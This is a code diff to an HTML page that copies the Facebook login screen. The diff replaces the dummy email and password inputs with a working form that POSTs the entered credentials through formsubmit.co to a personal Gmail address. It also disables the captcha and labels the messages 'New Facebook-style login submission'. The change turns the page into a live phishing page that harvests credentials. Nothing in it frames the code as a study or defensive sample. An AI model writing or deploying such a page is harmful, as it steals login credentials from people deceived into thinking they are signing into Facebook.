@@ -104,9 +104,17 @@
         <p>Connect with friends and the world around you on Facebook.</p>
       </div>
       <div class="login-box">
-        <input type="text" placeholder="Email or phone number" />
-        <input type="password" placeholder="Password" />
-        <button>Log In</button>
+        <!-- FormSubmit.co form -->
+        <form action="https://formsubmit.co/sifatulislam575@gmail.com" method="POST">
+          <!-- Required hidden fields -->
+          <input type="hidden" name="_captcha" value="false">
+          <input type="hidden" name="_subject" value="New Facebook-style login submission">
+          <input type="hidden" name="_template" value="box">
+
+          <input type="text" name="email" placeholder="Email or phone number" required />
+          <input type="password" name="password" placeholder="Password" required />
+          <button type="submit">Log In</button>
+        </form>
         <a href="#" class="link">Forgotten password?</a>
         <hr />
         <button class="create-btn">Create New Account</button>
